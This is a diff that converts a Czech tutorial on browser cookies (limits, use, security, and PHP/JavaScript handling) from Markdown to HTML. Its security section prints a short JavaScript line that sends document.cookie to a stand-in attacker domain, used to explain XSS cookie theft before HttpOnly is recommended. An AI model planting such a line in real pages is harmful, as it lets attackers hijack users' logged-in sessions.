@@ -5,192 +5,289 @@ description: "Kdy cookies (ne)používat a jak s nim pracovat v JavaScriptu a PH
 date: "2014-02-15"
 last_modification: "2015-10-15"
 status: 1
-tags: ["JavaScript", "PHP"]
+tags: ["js", "php"]
+format: "html"
 ---
 
-**Cookies** (česky *sušenky*) jsou malé soubory ukládané na straně klienta v prohlížeči.
+<p><b>Cookies</b> (česky <i>sušenky</i>) jsou malé soubory ukládané na straně klienta v prohlížeči.</p>
 
-Jedná se o nejstarší a nejlépe podporovaný způsob ukládání dat u návštěvníka. Tato data se odesílají při požadavku na server, což z nich dělá ideální nástroj pro **identifikaci**. Proto se většina přihlášení na webových stránkách bez cookie neobejde.
+<p>Jedná se o nejstarší a nejlépe podporovaný způsob ukládání dat u návštěvníka. Tato data se odesílají při požadavku na server, což z nich dělá ideální nástroj pro <b>identifikaci</b>. Proto se většina přihlášení na webových stránkách bez cookie neobejde.</p>
 
-Méně domyšlené aplikace na **nemožnost nastavit cookie** vůbec neupozorňují a bez sušenek se tak z *neznámých důvodů* nejde přihlásit.
+<p><img src="/files/cookies/fb-login.png" alt="Přihlášení na Facebooku bez cookies" class="border"></p>
 
-    - [Zjištění vypnutých cookies](/vypnute-cookies) – jak zjistit, jestli má návštěvník zapnuté nebo vypnuté cookies
 
-Kromě přihlašování uživatelů se cookies hojně používají pro jejich **sledování**. Cookie tak používají měřicí skripty jako je [Google Analytics](/ga) nebo různé reklamní systémy pro lepší cílení reklam.
 
-## Velikost cookies
 
-Z dnešního pohledu je hlavním omezení v používání cookies jejich **omezená velikost**.
 
-Při všech HTTP požadavcích se **odesílají na server** – to limituje jejich velikost a zvětšuje objem přenášených dat.
 
-**Bezpečná velikost** napříč prohlížeči je **4 kB** pro všechny cookies na dané doméně, bezpečný maximální počet sušenek je **20**. Novější prohlížeče mají limity velkorysejší. Do velikosti se kromě samotné **hodnoty** započítává i název cookie, nastavení expirace a podobně.
 
-        - [Browser Cookie Limits](http://browsercookielimits.squawky.net/) – limity v současných prohlížečích
 
-    Kvůli nepotřebnosti přenášení sušenek se někdy servírují statické soubory (styly, skripty, obrázky), které cookies k ničemu nevyžadují, z jiné domény.
+<p>Méně domyšlené aplikace na <b>nemožnost nastavit cookie</b> vůbec neupozorňují a bez sušenek se tak z <i>neznámých důvodů</i> nejde přihlásit.</p>
 
-## Kdy používat cookie
 
-V dnešní době je prakticky jediný rozumný případ užití sušenek **identifikace uživatele** mezi klientem a serverem. Nebo funkce **trvalé přihlášení**.
+<div class="internal-content">
+  <ul>
+    <li><a href="/vypnute-cookies">Zjištění vypnutých cookies</a> – jak zjistit, jestli má návštěvník zapnuté nebo vypnuté cookies</li>
+  </ul>
+</div>
 
-Po ověření přihlašovacích údajů se v prohlížeči uloží identifikátor, který se následně posílá s každým požadavkem. Server podle toho pozná, kdo je přihlášen a pošle mu příslušná data.
+<p>Kromě přihlašování uživatelů se cookies hojně používají pro jejich <b>sledování</b>. Cookie tak používají měřicí skripty jako je <a href="/ga">Google Analytics</a> nebo různé reklamní systémy pro lepší cílení reklam.</p>
 
-Přes *cookies* typicky fungují i [*session* v PHP](http://pehapko.cz/programujeme-v-php/sessions). V prohlížeči je cookie s názvem  `PHPSESSID`, kde je hodnota propojující prohlížeč s daty na serveru.
 
-Pro případy, kdy není nutné cookie neustále odesílat na server, je lepší používat **lokální úložiště**.
+<h2 id="velikost">Velikost cookies</h2>
 
-    - [Úložiště `localStorage`](/localstorage) – úložiště v prohlížeči klienta přístupné JavaScriptem
+<p>Z dnešního pohledu je hlavním omezení v používání cookies jejich <b>omezená velikost</b>.</p>
 
-Do toho se vejde více dat, takže je vhodné pro věci jako je ukládání **lokálního nastavení stránky** nebo [zálohy rozepsaných formulářů](/zalohovani-formularu). V případě potřeby se potom může jeho obsah přenést na server [AJAXem](/ajax).
+<p>Při všech HTTP požadavcích se <b>odesílají na server</b> – to limituje jejich velikost a zvětšuje objem přenášených dat.</p>
+    
+<p><b>Bezpečná velikost</b> napříč prohlížeči je <b>4 kB</b> pro všechny cookies na dané doméně, bezpečný maximální počet sušenek je <b>20</b>. Novější prohlížeče mají limity velkorysejší. Do velikosti se kromě samotné <b>hodnoty</b> započítává i název cookie, nastavení expirace a podobně.</p>
+    
+    <div class="external-content">
+      <ul>
+        <li><a href="http://browsercookielimits.squawky.net/">Browser Cookie Limits</a> – limity v současných prohlížečích</li>
+      </ul>
+    </div>
+    
+    <p>Kvůli nepotřebnosti přenášení sušenek se někdy servírují statické soubory (styly, skripty, obrázky), které cookies k ničemu nevyžadují, z jiné domény.</p>
 
-Teoreticky by šly cookies vyměnit za `localStorage`, ale bylo by to zbytečně [závislé na JavaScriptu](/bez-javascriptu). Nezávislost na JS je drobná výhoda cookies oproti lokálnímu úložišti.
 
-## Bezpečnost cookies
 
-Jelikož jsou cookies uloženy na disku uživatele, kdokoliv se k jeho počítači dostane, může se potom **kdekoliv přihlásit**, aniž by znal heslo.
 
-Některé služby se tomuto problému snaží předcházet tak, že každá cookie pro trvalé přihlášení je platná pouze pro daný prohlížeč. Jednotlivé prohlížeče v kombinaci s operačním systémem, nainstalovanými pluginy a fonty vytváří relativně **unikátní otisk**, který jde ověřovat.
 
-Často ale vítězí pohodlí uživatelů, kteří typicky dávají přednost zbytečnému neodhlašování před snížením risika krádeže cookie.
 
-### Krádež cookie JavaScriptem
+<h2 id="pouzivat">Kdy používat cookie</h2>
 
-Zjistit cookie potřebnou pro přihlášení jde někdy i pomocí JS. Pokud se na cizí stránku podaří propašovat vlastní JS kód, může jít získat cookie přihlášeného uživatele:
+<p>V dnešní době je prakticky jediný rozumný případ užití sušenek <b>identifikace uživatele</b> mezi klientem a serverem. Nebo funkce <b>trvalé přihlášení</b>.</p>
 
-    - [Využití XSS chyby](/xss) – jak je možné využít XSS díru na webové stránce 
 
-Cookie si lze snadno přenést na vlastní server.
 
-```
-var ping = new Image();
+<p>Po ověření přihlašovacích údajů se v prohlížeči uloží identifikátor, který se následně posílá s každým požadavkem. Server podle toho pozná, kdo je přihlášen a pošle mu příslušná data.</p>
+
+<p>Přes <i>cookies</i> typicky fungují i <a href="http://pehapko.cz/programujeme-v-php/sessions"><i>session</i> v PHP</a>. V prohlížeči je cookie s názvem  <code>PHPSESSID</code>, kde je hodnota propojující prohlížeč s daty na serveru.</p>
+
+
+<p>Pro případy, kdy není nutné cookie neustále odesílat na server, je lepší používat <b>lokální úložiště</b>.</p>
+
+
+
+<div class="internal-content">
+  <ul>
+    <li><a href="/localstorage">Úložiště <code>localStorage</code></a> – úložiště v prohlížeči klienta přístupné JavaScriptem</li>
+  </ul>
+</div>
+
+<p>Do toho se vejde více dat, takže je vhodné pro věci jako je ukládání <b>lokálního nastavení stránky</b> nebo <a href="/zalohovani-formularu">zálohy rozepsaných formulářů</a>. V případě potřeby se potom může jeho obsah přenést na server <a href="/ajax">AJAXem</a>.</p>
+
+<p>Teoreticky by šly cookies vyměnit za <code>localStorage</code>, ale bylo by to zbytečně <a href="/bez-javascriptu">závislé na JavaScriptu</a>. Nezávislost na JS je drobná výhoda cookies oproti lokálnímu úložišti.</p>
+
+
+<h2 id="bezpecnost">Bezpečnost cookies</h2>
+
+<p>Jelikož jsou cookies uloženy na disku uživatele, kdokoliv se k jeho počítači dostane, může se potom <b>kdekoliv přihlásit</b>, aniž by znal heslo.</p>
+
+
+
+<p>Některé služby se tomuto problému snaží předcházet tak, že každá cookie pro trvalé přihlášení je platná pouze pro daný prohlížeč. Jednotlivé prohlížeče v kombinaci s operačním systémem, nainstalovanými pluginy a fonty vytváří relativně <b>unikátní otisk</b>, který jde ověřovat.</p>
+
+
+<p>Často ale vítězí pohodlí uživatelů, kteří typicky dávají přednost zbytečnému neodhlašování před snížením risika krádeže cookie.</p>
+
+
+
+<h3 id="kradez-js">Krádež cookie JavaScriptem</h3>
+
+<p>Zjistit cookie potřebnou pro přihlášení jde někdy i pomocí JS. Pokud se na cizí stránku podaří propašovat vlastní JS kód, může jít získat cookie přihlášeného uživatele:</p>
+
+
+<div class="internal-content">
+  <ul>
+    <li><a href="/xss">Využití XSS chyby</a> – jak je možné využít XSS díru na webové stránce </li>
+  </ul>
+</div>
+
+<p>Cookie si lze snadno přenést na vlastní server.</p>
+
+<pre><code>var ping = new Image();
 ping.src = "http://domena-utocnika.cz/?" + 
-            encodeURI(document.cookie);
-```
+            encodeURI(document.cookie);</code></pre>
 
-Kromě opravení XSS díry je řešení nastavit sušenky jako `HttpOnly`. Potom se k nim JavaScript vůbec nedostane.
 
-## Jak zobrazit cookie?
 
-Podívat se na cookie, které jsou pro danou stránku nastaveny, jde ve [vývojářských nástrojích](/vyvojarske-nastroje) (klávesa F12).
 
-V **Chrome** jsou na kartě *Resources*:
 
-Sušenky tam jde pouze mazat. Pro upravování je potřeba rozšíření. Na obrázku jsou cookies, které přidává Google Analytics.
+<p>Kromě opravení XSS díry je řešení nastavit sušenky jako <code>HttpOnly</code>. Potom se k nim JavaScript vůbec nedostane.</p>
 
-## Testování
 
-Jelikož cookies ovlivňují chování aplikace, může se při vývoji stát, že se stránka bude chovat neočekávávaně. Na vině mohou být dříve nastavené sušenky se špatnou hodnotou.
+<h2 id="prohlizeni">Jak zobrazit cookie?</h2>
 
-Proto je dobré čas od času cookies promazat nebo **aplikaci otevřít v anonymním okně** – Ctrl + Shift + N v **Chrome**/**Opeře** a Ctrl + Shift + P pro **Firefox**/[**Edge**](/microsoft-edge).
+<p>Podívat se na cookie, které jsou pro danou stránku nastaveny, jde ve <a href="/vyvojarske-nastroje">vývojářských nástrojích</a> (klávesa <kbd>F12</kbd>).</p>
 
-U anonymního okna si je třeba uvědomit, že otevření další záložky už bude vidět cookie vytvořené v první záložce, takže i anonymní okno je potřeba občas otevřít znovu.
+<p>V <b>Chrome</b> jsou na kartě <i>Resources</i>:</p>
 
-## Cookies v PHP
+<p><img src="/files/cookies/prehled-cookies.png" alt="Přihlášení na Facebooku bez cookies" class="border"></p>
 
-Cookie se v PHP nastaví funkcí `[setcookie](http://www.php.net/manual/en/function.setcookie.php)`:
 
-```
-setcookie(
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>Sušenky tam jde pouze mazat. Pro upravování je potřeba rozšíření. Na obrázku jsou cookies, které přidává Google Analytics.</p>
+
+
+<h2 id="testovani">Testování</h2>
+
+<p>Jelikož cookies ovlivňují chování aplikace, může se při vývoji stát, že se stránka bude chovat neočekávávaně. Na vině mohou být dříve nastavené sušenky se špatnou hodnotou.</p>
+
+<p>Proto je dobré čas od času cookies promazat nebo <b>aplikaci otevřít v anonymním okně</b> – <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>N</kbd> v <b>Chrome</b>/<b>Opeře</b> a <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>P</kbd> pro <b>Firefox</b>/<a href="/microsoft-edge"><b>Edge</b></a>.</p>
+
+<p>U anonymního okna si je třeba uvědomit, že otevření další záložky už bude vidět cookie vytvořené v první záložce, takže i anonymní okno je potřeba občas otevřít znovu.</p>
+
+
+<h2 id="php">Cookies v PHP</h2>
+
+<p>Cookie se v PHP nastaví funkcí <code><a href="http://www.php.net/manual/en/function.setcookie.php">setcookie</a></code>:</p>
+
+<pre><code>setcookie(
   "nazev-cookie", 
   $hodnota,
   strtotime('+1 years')
-);
-```
+);</code></pre>
 
-První parametr je název, druhý hodnota cookie a třetí **platnost**. Platnost je nepovinná, ale bez jejího uvedení cookie zanikne po zavření prohlížeče. Nastavení platnosti jde provést docela elegantně funkcí `strtotime`.
 
-Nepovinná je i hodnota sušenky.
 
-Dále jde uvést ještě cestu a doménu, kde sušenka platí, funkčnost jen na [HTTPS](/https) a příznak `httponly`, aby se ke cookie nedalo dostat JavaScriptem.
 
-```
-setcookie(
+
+<p>První parametr je název, druhý hodnota cookie a třetí <b>platnost</b>. Platnost je nepovinná, ale bez jejího uvedení cookie zanikne po zavření prohlížeče. Nastavení platnosti jde provést docela elegantně funkcí <code>strtotime</code>.</p>
+
+<p>Nepovinná je i hodnota sušenky.</p>
+
+<p>Dále jde uvést ještě cestu a doménu, kde sušenka platí, funkčnost jen na <a href="/https">HTTPS</a> a příznak <code>httponly</code>, aby se ke cookie nedalo dostat JavaScriptem.</p>
+
+
+<pre><code>setcookie(
   "nazev-cookie", 
   $hodnota,
   strtotime('+1 years'), // platnost
   "", // path
   "", // domain
   false, // HTTPS
-  **true** // httponly
-);
-```
+  <b>true</b> // httponly
+);</code></pre>
 
-Nastavit chování sušenek globálně jde funkcí `[session_set_cookie_params](http://www.php.net/manual/en/function.session-set-cookie-params.php)`.
 
-### Přečtení cookie v PHP
 
-Sušenky jsou potom přístupné v poli `$_COOKIE`.
 
-```
-&lt;?php echo $_COOKIE["nazev"] ?>
-```
 
-### Smazání cookie
 
-```
-setcookie("nazev", "", 1);
-```
 
-## Cookies v JavaScriptu
 
-V JS prakticky není důvod cookie používat. Snad jen kvůli jejich snadnému a automatickému přenášení na server v situaci, kdy **nepřenesení dat není kritické**.
 
-Po nastavení cookie JavaScriptem je totiž ještě nutné provést HTTP požadavek, aby se informace přenesla na server.
 
-Lepší je používat [`localStorage`](/localstorage), které není tak datově limitující, nemá omezenou dobu platnosti a má pohodlnější rozhraní pro používání.
 
-### Nastavení cookie v JS
+<p>Nastavit chování sušenek globálně jde funkcí <code><a href="http://www.php.net/manual/en/function.session-set-cookie-params.php">session_set_cookie_params</a></code>.</p>
 
-Vytvoření cookie v prostém JS s dlouhou platností vypadá následovně:
+<h3 id="cteni">Přečtení cookie v PHP</h3>
 
-```
-document.cookie = 
-  "nazev=hodnota; expires=Fri, 31 Dec 9999 23:59:59 GMT";
-```
+<p>Sušenky jsou potom přístupné v poli <code>$_COOKIE</code>.</p>
 
-Ne všechny prohlížeče nastaví této cookie platnost na rok 9999.
+<pre><code>&lt;?php echo $_COOKIE["nazev"] ?></code></pre>
 
-Pokud se má cookie smazat po zavření prohlížeče, nemusí se expirace uvádět:
 
-```
-document.cookie = "nazev=hodnota";
-```
 
-### Smazání cookie
 
-Smazání proběhne nastavením expirace do minulosti.
 
-```
-document.cookie = 
-  "nazev=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
-```
+<h3 id="php-smazani">Smazání cookie</h3>
 
-### Přečtení cookie v JS
+<pre><code>setcookie("nazev", "", 1);</code></pre>
 
-Nejkomplikovanější je získat hodnotu cookie podle názvu.
 
-Rychlé a ne 100% spolehlivé řešení na testování přítomnosti cookie je:
+<h2 id="js">Cookies v JavaScriptu</h2>
 
-```
-if (document.cookie.indexOf("nazev=hodnota") == -1) {
+<p>V JS prakticky není důvod cookie používat. Snad jen kvůli jejich snadnému a automatickému přenášení na server v situaci, kdy <b>nepřenesení dat není kritické</b>.</p>
+
+
+<p>Po nastavení cookie JavaScriptem je totiž ještě nutné provést HTTP požadavek, aby se informace přenesla na server.</p>
+
+<p>Lepší je používat <a href="/localstorage"><code>localStorage</code></a>, které není tak datově limitující, nemá omezenou dobu platnosti a má pohodlnější rozhraní pro používání.</p>
+
+
+
+
+
+<h3 id="nastaveni">Nastavení cookie v JS</h3>
+
+<p>Vytvoření cookie v prostém JS s dlouhou platností vypadá následovně:</p>
+
+<pre><code>document.cookie = 
+  "nazev=hodnota; expires=Fri, 31 Dec 9999 23:59:59 GMT";</code></pre>
+
+
+
+<p>Ne všechny prohlížeče nastaví této cookie platnost na rok 9999.</p>
+
+
+<p>Pokud se má cookie smazat po zavření prohlížeče, nemusí se expirace uvádět:</p>
+
+<pre><code>document.cookie = "nazev=hodnota";</code></pre>
+
+
+
+
+<h3 id="smazani">Smazání cookie</h3>
+
+<p>Smazání proběhne nastavením expirace do minulosti.</p>
+
+<pre><code>document.cookie = 
+  "nazev=; expires=Thu, 01 Jan 1970 00:00:00 GMT";</code></pre>
+
+
+
+
+<h3 id="precteni">Přečtení cookie v JS</h3>
+
+<p>Nejkomplikovanější je získat hodnotu cookie podle názvu.</p>
+
+<p>Rychlé a ne 100% spolehlivé řešení na testování přítomnosti cookie je:</p>
+
+<pre><code>if (document.cookie.indexOf("nazev=hodnota") == -1) {
   // cookie „nazev“ s hodnotou „hodnota“ neexistuje
 }
 else {
   // existuje
-}
-```
+}</code></pre>
 
-Pro získání konkrétní hodnoty je potom nutné projít řetězec obsahující všechny cookie na stránce, ten vypadá nějak takto:
 
-```
-nazev=hodnota; nazev2=hodnota2
-```
 
-Nezbývá tedy než řetězec rozsekat podle „`; `“, projít [cyklem](/js-cykly), rozdělit podle „`=`“ a porovnat z názvem a případně vrátit hodnotu:
 
-```
-function precistCookie(nazev) {
+
+
+
+
+
+
+<p>Pro získání konkrétní hodnoty je potom nutné projít řetězec obsahující všechny cookie na stránce, ten vypadá nějak takto:</p>
+
+<pre><code>nazev=hodnota; nazev2=hodnota2</code></pre>
+
+<p>Nezbývá tedy než řetězec rozsekat podle „<code>; </code>“, projít <a href="/js-cykly">cyklem</a>, rozdělit podle „<code>=</code>“ a porovnat z názvem a případně vrátit hodnotu:</p>
+
+<pre><code>function precistCookie(nazev) {
     var susenky = document.cookie.split("; ");
     for (var i in susenky) {
         susenka = susenky[i].split("=");
@@ -199,11 +296,26 @@ function precistCookie(nazev) {
         }
     }
     return false;
-}
-```
+}</code></pre>
 
-### Pokročilejší hotové řešení
 
-Pro pohodlnější práci s cookie jde použít menší framework z MDN:
 
-    - [A little framework: a complete cookies reader/writer with full unicode support](https://developer.mozilla.org/en-US/docs/Web/API/document/cookie#A_little_framework_a_complete_cookies_readerwriter_with_full_unicode_support)
+
+
+
+
+
+
+
+<h3 id="hotove-reseni">Pokročilejší hotové řešení</h3>
+
+<p>Pro pohodlnější práci s cookie jde použít menší framework z MDN:</p>
+
+<div class="external-content">
+  <ul>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/document/cookie#A_little_framework_a_complete_cookies_readerwriter_with_full_unicode_support">A little framework: a complete cookies reader/writer with full unicode support</a></li>
+  </ul>
+</div>
+
+
+<!-- test nastavení a výpis cookie: http://kod.djpw.cz/ferb- -->
